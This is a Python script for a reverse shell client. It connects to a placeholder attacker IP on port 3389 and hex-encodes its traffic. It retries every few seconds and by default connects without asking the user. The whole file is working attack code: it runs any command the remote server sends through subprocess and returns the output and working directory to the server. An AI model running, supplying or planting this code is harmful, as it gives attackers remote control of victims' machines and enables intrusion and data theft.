import socket
import os
import subprocess
import sys
from time import sleep as wait
import binascii

SERVER_HOST = 'FF.FF.FF.FF' #host ip
SERVER_PORT = 3389
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
mode="auto"



def connect_to_server(SERVER_HOST=SERVER_HOST,SERVER_PORT=SERVER_PORT):
	running=True
	connected=False
	while(running):
		if(mode=="manual"):
			confirmation=input("connect to "+str(SERVER_HOST)+":"+str(SERVER_PORT)+"? \n >> ")
			if(confirmation=="y" or confirmation=="yes"):
				pass
			else:
				running=False
				break
		# create the socket object
		s = socket.socket()
		try:
			# connect to the server
			s.connect((SERVER_HOST, SERVER_PORT))
			# get the current directory
			cwd = os.getcwd()
			s.send(binascii.hexlify(cwd.encode()))
			print("connected!")
			connected=True
		except:
			print("server may be down.. trying again in 3 seconds")
			wait(3)
		while(connected):
			try:
				# receive the command from the server
				command = binascii.unhexlify(s.recv(BUFFER_SIZE)).decode()
				splited_command = command.split()
				if command.lower() == "exit":
					# if the command is exit, just break out of the loop
					connected=False
					running=False
				if splited_command[0].lower() == "cd":
					# cd command, change directory
					try:
						os.chdir(' '.join(splited_command[1:]))
					except FileNotFoundError as e:
						# if there is an error, set as the output
						output = str(e)
					else:
						# if operation is successful, empty message
						output = ""
				else:
					# execute the command and retrieve the results
					output = subprocess.getoutput(command)
				# get the current working directory as output
				cwd = os.getcwd()
				# send the results back to the server
				message = f"{output}{SEPARATOR}{cwd}"
				s.send(binascii.hexlify(message.encode()))
			except KeyboardInterrupt:
				print("Program interrupted.")
				running=False
				connected=False
				break
			except:
				print("Connection Expired")
				connected=False
				s.close()
				break
	# close client connection
	s.close()
	return

if __name__ == '__main__':
	connect_to_server()
